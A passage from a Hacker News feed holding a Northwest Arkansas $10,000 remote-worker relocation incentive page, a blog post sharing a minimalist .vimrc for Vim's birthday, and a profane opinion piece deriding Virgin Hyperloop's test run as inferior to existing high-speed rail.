		<p>Northwest Arkansas is a great place to work, live and play: for recent grads, families, career changers, entrepreneurs, artists and more. We’re offering top remote working talent – maybe you? – a $10,000 cash incentive to move to the region. The funds will help with everything you need to set up your new life in Northwest Arkansas.</p>
<p>In addition to $10,000, incentive recipients will be gifted a street or mountain bicycle to help you take advantage of the 162 miles of paved trails, the 37-mile Razorback Regional Greenway and the 322 miles of world-class mountain biking trails that has made outdoor enthusiasts flock to the area. Alternatively, participants can choose an annual membership to one of our world-class arts and cultural institutions.</p>
	</div>
</div>




		</div> 
	</div>
	</div> 
</div></div><div id="fws_5fb0ab0b4c9cd" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h3>Where do I apply?</h3>
</p>
<div>
	<p>Can you work anywhere?&nbsp; <strong>You can truly live here.</strong></p>
</div>




		</div> 
	</div>
	</div> 
</div></div><div data-style="default"><div data-inner-wrap="true"><h3><a href="#"><i></i>Check Your Eligibility</a></h3><div><div><div data-list-icon="none" data-animation="true" data-animation-delay="0" data-color="accent-color" data-spacing="default" data-alignment="left"> 
<ol>
<li><span>At least 24 years old</span></li>
<li><span>Have at least two years of work experience</span></li>
<li><span>Have full-time employment (which includes self-employment)</span></li>
<li><span>Currently resides outside of the state of Arkansas&nbsp;</span></li>
<li><span>Can relocate to Northwest Arkansas within six months of acceptance</span></li>
<li><span>U.S. citizen or has the necessary credentials required to work legally in the U.S.</span></li>
</ol>
 </div></div></div></div></div>




















			</div> 
		</div>
	</div> 

	 
</div></div>
		
		<div id="fws_5fb0ab0b5612e" data-column-margin="default" data-midnight="light" data-top-percent="8%" data-bottom-percent="8%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb0ab0b563e0" data-midnight="" data-column-margin="default"><div>
	 

	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="left-right" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h2><span>Take a closer look at Northwest Arkansas</span></h2>
</p>
<div>
	<p><span>You’ll quickly come to realize, life works here. </span><span>Employment is abundant, housing is affordable, commutes are short, and the region is filled with a sense of possibility, a place where you can have a real impact.</span></p>
</div>



<p><a href="https://findingnwa.com/regional-guide/" data-color-override="false" data-hover-color-override="false" data-hover-text-color-override="#fff"><span>Explore Northwest Arkansas</span><i></i></a>
		</p></div> 
	</div>
	</div> 

	 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		
		<div id="jobs" data-column-margin="default" data-midnight="light"><div>
	<div data-using-bg="true" data-t-w-inherits="default" data-overlay-color="true" data-bg-cover="true" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="0.4" data-hover-bg="" data-hover-bg-opacity="0.4" data-animation="grow-in" data-delay="0">
		<div>
			<div>
				<p data-animation-type="line-reveal-by-space" data-animation-delay="0" data-custom-font-size="false"><h3>Seeking a new career opportunity?</h3></p><p>With more than 10,000 open positions and an exceedingly low 2.8% unemployment rate, your next adventure awaits you in Northwest Arkansas.</p><p><a target="_blank" href="https://workforceconnection.careerconcourse.com/" data-color-override="false" data-hover-color-override="#ef404d" data-hover-text-color-override="#ffffff"><span>Search Here</span></a></p>
			</div> 
		</div>
	</div> 

	<div data-using-bg="true" data-t-w-inherits="default" data-overlay-color="true" data-bg-cover="true" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="0.5" data-hover-bg="" data-hover-bg-opacity="0.5" data-animation="grow-in" data-delay="150">
		<div>
			<div>
				<p data-animation-type="line-reveal-by-space" data-animation-delay="0" data-custom-font-size="false"><h3>Find a place to call home.</h3></p><p>With one of the best costs of living in the nation, you can find your dream home in Northwest Arkansas.</p><p><a target="_blank" href="https://www.zillow.com/homes/for_sale/_type/3-_beds/2.0-_baths/?searchQueryState=%7B%22pagination%22%3A%7B%7D%2C%22usersSearchTerm%22%3A%22northwest%20arkansas%22%2C%22mapBounds%22%3A%7B%22west%22%3A-94.71758586468067%2C%22east%22%3A-93.49810344280567%2C%22south%22%3A35.649884080973045%2C%22north%22%3A36.597180790040504%7D%2C%22isMapVisible%22%3Atrue%2C%22filterState%22%3A%7B%22beds%22%3A%7B%22min%22%3A3%7D%2C%22baths%22%3A%7B%22min%22%3A2%7D%2C%22sort%22%3A%7B%22value%22%3A%22globalrelevanceex%22%7D%2C%22pmf%22%3A%7B%22value%22%3Afalse%7D%2C%22pf%22%3A%7B%22value%22%3Afalse%7D%2C%22ah%22%3A%7B%22value%22%3Atrue%7D%2C%22con%22%3A%7B%22value%22%3Afalse%7D%2C%22mf%22%3A%7B%22value%22%3Afalse%7D%2C%22manu%22%3A%7B%22value%22%3Afalse%7D%2C%22tow%22%3A%7B%22value%22%3Afalse%7D%2C%22apa%22%3A%7B%22value%22%3Afalse%7D%2C%22sf%22%3A%7B%22value%22%3Afalse%7D%2C%22land%22%3A%7B%22value%22%3Afalse%7D%7D%2C%22isListVisible%22%3Atrue%7D" data-color-override="false" data-hover-color-override="#ef404d" data-hover-text-color-override="#ffffff"><span>Search Here</span></a></p>
			</div> 
		</div>
	</div> 
</div></div>
		<div id="qa" data-column-margin="default" data-midnight="dark" data-bottom-percent="3%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				




<div data-style="minimal"><div data-inner-wrap="true"><h3><a href="#"><i></i>Why is the NWA Council offering the incentive?</a></h3><div><div>
<div>
	<div>
		<p><span>Northwest Arkansas has more than 10,000 job openings right now and has a shortage of talent to fill available STEAM jobs. We want to attract talent who will help us build a richer long-term talent pipeline that supports our thriving local economy. </span></p>
<p><span>The incentive is specifically targeting remote workers – we are looking for people who can meaningfully contribute to and actively participate in our vibrant community.</span></p>
	</div>
</div>



</div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>Who is the ideal candidate for the program?</a></h3><div><div>
<div>
	<p><span>We’re looking for all kinds of talent, but the most in-demand talent in our region are STEAM professionals and entrepreneurs.</span> <span>We’ll assess the applicants’ skills in relation to our region’s needs, as well as what they can add to our community.</span> <span>We’re not looking for someone who can only do a good job at work. We’re looking for people who will add to the vibrancy of our community.</span></p>
</div>



</div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>What types of incentives will recipients receive?</a></h3><div><div>
<div>
	<p><span>In addition to the $10,000 grant, recipients will be gifted either a bike – to help new residents take advantage of the outdoors on their own terms – or a free annual membership to one of our world-class arts and cultural institutions – Crystal Bridges, Momentary, Amazeum, TheatreSquared, Walton Arts Center and Walmart AMP.</span></p>
</div>



</div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>Are there qualifications?</a></h3><div><div><div id="eligibility" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			
<div>
	<div>
		<p><span>In order to be eligible for the program, applicants must have the ability to relocate to Northwest Arkansas within six months of acceptance, sign a lease for local housing or purchase a house, be at least 24 years old, have at least two years of work experience, have full-time remote employment (which includes self-employment), currently reside outside of the state of Arkansas, and be a U.S. citizen or have the necessary credentials required to work legally in the U.S.</span></p>
<p><strong>Eligibility Check List:</strong></p>
<ol>
<li><span>At least 24 years old</span></li>
<li><span>Have at least two years of work experience</span></li>
<li><span>Have full-time employment (which includes self-employment)</span></li>
<li><span>Currently resides outside of the state of Arkansas&nbsp;</span></li>
<li><span>Can relocate to Northwest Arkansas within six months of acceptance</span></li>
<li><span>U.S. citizen or has the necessary credentials required to work legally in the U.S.</span></li>
</ol>
	</div>
</div>




		</div> 
	</div>
	</div> 
</div></div></div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>How are recipients selected?</a></h3><div><div>
<div>
	<p><span>A review panel selected by the Northwest Arkansas Council will evaluate individual applicants, interview candidates and award the incentives to selected applicants.</span></p>
</div>



</div></div></div></div>




















			</div> 
		</div>
	</div> 
</div></div>
		
		<div id="fws_5fb0ab0b6215a" data-column-margin="default" data-midnight="dark" data-top-percent="8%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb0ab0b62483" data-midnight="" data-column-margin="default"><div>
	 

	<div data-cfc="true" data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			
<div>
	<p>
		<h4><span>We’d love to share more about what makes Northwest Arkansas the perfect place to live.</span></h4>
	</p>
</div>




		</div> 
	</div>
	</div> 

	 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		
		
		
			
		</div><!--/row-->
	</div><!--/container-->
</div></div>]]>
            </description>
            <link>https://findingnwa.com/incentive/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072346</guid>
            <pubDate>Thu, 12 Nov 2020 17:40:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My minimalist .vimrc in a VIM appreciation post – maybe it is useful]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072323">thread link</a>) | @banyek
<br/>
November 12, 2020 | https://blog.balazspocze.me/2020/11/04/happy-birthday-vim/ | <a href="https://web.archive.org/web/*/https://blog.balazspocze.me/2020/11/04/happy-birthday-vim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #masthead -->

	<div id="content">

	<div id="primary">
		<main id="main">

		
<article id="post-361">
	<!-- .entry-header -->

	<div>
		
<p>Vim turned 29 this day. Yay! I am a heavy vim user, it is my editor of choice in every operating system, however, I always installing some GUI editors as well (atom or sublime) for quick copy-paste tasks.</p>



<p>But this post is about vim. </p>



<p>I pretty much love it. I love the way how seamlessly it integrates into my daily workflow. I avoid using vim plugins and fancy configuration parameters, I try to keep it clean and easy. (Yes, I’ll share my .vimrc at the end of this post)</p>



<p>My normal workflow utilizes mostly the UNIX shell, I am rarely keep multiple files open – except I plan to copy-paste between two files. When I have to edit a file, I enter the work directory, open the file with vim, do my edits then save, and go for the next file. Sometimes I use ‘gf’ and ctrl+O to navigate between files, I often use sed like replacements inside files, and when I have to edit multiple files I am mostly use macro recording. And that’s it, I guess. The main part of my config is about how to colorize the output, what to do with the whitespaces, things like those. I keep vim plugin free because I can easily copy my .vimrc to any server I have to work on.</p>



<p>I never really understood anybody who use IDE when there’s an UNIX shell, but that’s only me, if you are somebody who loves that software: you have my blessings. Good for you. </p>



<p>Anyway, keep it going Bram, you are awesome. </p>



<p>Here is my .vimrc in case you are curious. </p>



<figure><div>
<div id="gist106270060">
    <div>
      <div>
        <div>
  <div id="file-vimrc-vim">
    

  <div itemprop="text">
      
<table data-tab-size="8" data-paste-markdown-skip="">
      <tbody><tr>
        <td id="file-vimrc-vim-L1" data-line-number="1"></td>
        <td id="file-vimrc-vim-LC1"><span><span>"</span></span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L2" data-line-number="2"></td>
        <td id="file-vimrc-vim-LC2"><span><span>"</span>  Do not forget to create ~/.vim directory</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L3" data-line-number="3"></td>
        <td id="file-vimrc-vim-LC3"><span><span>"</span></span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L4" data-line-number="4"></td>
        <td id="file-vimrc-vim-LC4">
</td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L5" data-line-number="5"></td>
        <td id="file-vimrc-vim-LC5"><span>set</span> <span>nocompatible</span><span>                                        <span>"</span> behave VIM not VI</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L6" data-line-number="6"></td>
        <td id="file-vimrc-vim-LC6"><span>set</span> <span>number</span><span>                                              <span>"</span> Line numbering</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L7" data-line-number="7"></td>
        <td id="file-vimrc-vim-LC7"><span>autocmd</span> <span>BufWritePre</span> <span>*</span>.<span>pp</span> :<span>%</span><span>s</span><span>/\s\+$/</span>/<span>e</span><span>                   <span>"</span> White spaces                 </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L8" data-line-number="8"></td>
        <td id="file-vimrc-vim-LC8"><span>autocmd</span> <span>BufNewFile</span>,<span>BufRead</span> <span>*</span>.<span>pp</span> <span>set</span> <span>filetype</span><span>=</span><span>ruby</span><span>       <span>"</span> ruby syntax highlight for puppet </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L9" data-line-number="9"></td>
        <td id="file-vimrc-vim-LC9"><span>autocmd</span> <span>BufNewFile</span>,<span>BufRead</span> <span>*</span>.<span>cf</span> <span>set</span> <span>filetype</span><span>=</span>yaml<span>       <span>"</span> yaml syntax highlight for cloudformation</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L10" data-line-number="10"></td>
        <td id="file-vimrc-vim-LC10"><span>autocmd</span> <span>BufNewFile</span>,<span>BufRead</span> <span>*</span>.toml <span>set</span> <span>filetype</span><span>=</span>dosini<span>   <span>"</span> ini syntax highlith for rust's toml files</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L11" data-line-number="11"></td>
        <td id="file-vimrc-vim-LC11"><span>syntax</span> <span>on</span><span>                                               <span>"</span> use syntax highlight</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L12" data-line-number="12"></td>
        <td id="file-vimrc-vim-LC12"><span>filetype</span> <span>indent</span> <span>plugin</span> <span>on</span><span>                               <span>"</span> Indent files</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L13" data-line-number="13"></td>
        <td id="file-vimrc-vim-LC13"><span>set</span> <span>hidden</span><span>                                              <span>"</span> make able to switch between buffers without saving them </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L14" data-line-number="14"></td>
        <td id="file-vimrc-vim-LC14"><span>set</span> <span>showcmd</span><span>                                             <span>"</span> show current command</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L15" data-line-number="15"></td>
        <td id="file-vimrc-vim-LC15"><span>set</span> <span>showmatch</span><span>                                           <span>"</span> show matching brackets</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L16" data-line-number="16"></td>
        <td id="file-vimrc-vim-LC16"><span>set</span> <span>hlsearch</span><span>                                            <span>"</span> highlight searched words</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L17" data-line-number="17"></td>
        <td id="file-vimrc-vim-LC17"><span>set</span> <span>backspace</span><span>=</span><span>indent</span>,<span>eol</span>,<span>start</span><span>                          <span>"</span> make able to use backspace in edit mode</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L18" data-line-number="18"></td>
        <td id="file-vimrc-vim-LC18"><span>set</span> <span>autoindent</span><span>                                          <span>"</span> turn on identing </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L19" data-line-number="19"></td>
        <td id="file-vimrc-vim-LC19"><span>set</span> <span>nostartofline</span><span>                                       <span>"</span> after G not ruin the last line</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L20" data-line-number="20"></td>
        <td id="file-vimrc-vim-LC20"><span>set</span> <span>ruler</span><span>                                               <span>"</span> Which column I am in?</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L21" data-line-number="21"></td>
        <td id="file-vimrc-vim-LC21"><span>set</span> <span>laststatus</span><span>=</span><span>2</span><span>                                        <span>"</span> always display status line</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L22" data-line-number="22"></td>
        <td id="file-vimrc-vim-LC22"><span>set</span> <span>confirm</span><span>                                             <span>"</span> ask confirmation instead of failing when file is not saved</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L23" data-line-number="23"></td>
        <td id="file-vimrc-vim-LC23"><span>set</span> <span>cmdheight</span><span>=</span><span>2</span><span>                                         <span>"</span> make enough space for display messages</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L24" data-line-number="24"></td>
        <td id="file-vimrc-vim-LC24"><span>set</span> <span>tabstop</span><span>=</span><span>4</span> <span>softtabstop</span><span>=</span><span>0</span> <span>expandtab</span> <span>shiftwidth</span><span>=</span><span>4</span> <span>smarttab</span><span> <span>"</span> tab behaviour (spaces instead of tabs)</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L25" data-line-number="25"></td>
        <td id="file-vimrc-vim-LC25"><span>set</span> <span>wildmenu</span><span>                                            <span>"</span> use command line completion on opening filenames</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L26" data-line-number="26"></td>
        <td id="file-vimrc-vim-LC26"><span>set</span> <span>foldenable</span><span>                                          <span>"</span> use folds</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L27" data-line-number="27"></td>
        <td id="file-vimrc-vim-LC27"><span>set</span> <span>clipboard</span><span>=</span>unnamed<span>                                   <span>"</span> for OSX: if I copy lines to buffer, put them to the clipboard as well</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L28" data-line-number="28"></td>
        <td id="file-vimrc-vim-LC28"><span>set</span> <span>cul</span><span>                                                 <span>"</span> highligh cursor's line</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L29" data-line-number="29"></td>
        <td id="file-vimrc-vim-LC29"><span>colorscheme</span> peachpuff<span>                                   <span>"</span> colorscheme</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L30" data-line-number="30"></td>
        <td id="file-vimrc-vim-LC30"><span>set</span> <span>background</span><span>=</span>dark<span>                                     <span>"</span> I prefer dark terminal backgrounds</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L31" data-line-number="31"></td>
        <td id="file-vimrc-vim-LC31"><span>hi</span> <span>CursorLine</span>   cterm<span>=</span><span>NONE</span> ctermbg<span>=</span><span>darkblue</span> ctermfg<span>=</span><span>white</span> guibg<span>=</span><span>darkred</span> guifg<span>=</span><span>white</span><span>  <span>"</span> cursor line color</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L32" data-line-number="32"></td>
        <td id="file-vimrc-vim-LC32"><span>hi</span> <span>CursorColumn</span> cterm<span>=</span><span>NONE</span> ctermbg<span>=</span><span>darkblue</span> ctermfg<span>=</span><span>white</span> guibg<span>=</span><span>darkblue</span> guifg<span>=</span><span>white</span><span> <span>"</span> if cursors column is highlighted use these colors </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L33" data-line-number="33"></td>
        <td id="file-vimrc-vim-LC33"><span>set</span> <span>listchars</span><span>=</span><span>eol</span>:¬,<span>tab</span>:&gt;·,trai<span><span>l:</span></span>~,extend<span><span>s:</span></span>&gt;,precede<span><span>s:</span></span>&lt;,space:␣<span> <span>"</span> use these symbols for whitespaces (works in my iterm)</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L34" data-line-number="34"></td>
        <td id="file-vimrc-vim-LC34"><span>nnoremap</span> <span>&lt;Leader&gt;</span><span>c</span> :<span>set</span> <span>cursorline</span><span>!</span> <span>cursorcolumn</span><span>!</span><span>&lt;CR&gt;</span>.<span>  <span>"</span> turn on cursor line </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L35" data-line-number="35"></td>
        <td id="file-vimrc-vim-LC35">
</td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L36" data-line-number="36"></td>
        <td id="file-vimrc-vim-LC36">
</td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L37" data-line-number="37"></td>
        <td id="file-vimrc-vim-LC37"><span>autocmd</span> <span>BufWinLeave</span> <span>*</span>.<span>*</span> <span>mkview</span><span>                           <span>"</span> When exiting a file remember the opened line </span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L38" data-line-number="38"></td>
        <td id="file-vimrc-vim-LC38"><span>autocmd</span> <span>BufWinEnter</span> <span>*</span>.<span>*</span> <span>loadview</span><span>                         <span>"</span> When opening a file, move cursor to the previously opened position</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L39" data-line-number="39"></td>
        <td id="file-vimrc-vim-LC39"><span>augroup</span> <span>BgHighlight</span><span>                                      <span>"</span> When multiple buffers are open, show the cursor line only in the active window</span></td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L40" data-line-number="40"></td>
        <td id="file-vimrc-vim-LC40">    <span>autocmd</span><span>!</span>                                               </td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L41" data-line-number="41"></td>
        <td id="file-vimrc-vim-LC41">    <span>autocmd</span> <span>WinEnter</span> <span>*</span> <span>set</span> <span>cul</span>                             </td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L42" data-line-number="42"></td>
        <td id="file-vimrc-vim-LC42">    <span>autocmd</span> <span>WinLeave</span> <span>*</span> <span>set</span> <span>nocul</span>                          </td>
      </tr>
      <tr>
        <td id="file-vimrc-vim-L43" data-line-number="43"></td>
        <td id="file-vimrc-vim-LC43"><span>augroup</span> <span>END</span>                                              </td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>

</div></figure>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-361 -->

		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->

	</div><!-- #content -->

	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://blog.balazspocze.me/2020/11/04/happy-birthday-vim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072323</guid>
            <pubDate>Thu, 12 Nov 2020 17:39:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virgin Hyperloop Has Invented the World’s Crappiest High-Speed Rail]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25072110">thread link</a>) | @iron0013
<br/>
November 12, 2020 | https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/ | <a href="https://web.archive.org/web/*/https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>




</div></div></div></div></div>]]>
            </description>
            <link>https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072110</guid>
            <pubDate>Thu, 12 Nov 2020 17:24:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An overview of TeXmacs from altitude]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071915">thread link</a>) | @mgubi
<br/>
November 12, 2020 | https://texmacs.github.io/notes/docs/overview.html | <a href="https://web.archive.org/web/*/https://texmacs.github.io/notes/docs/overview.html">archive.org</a>
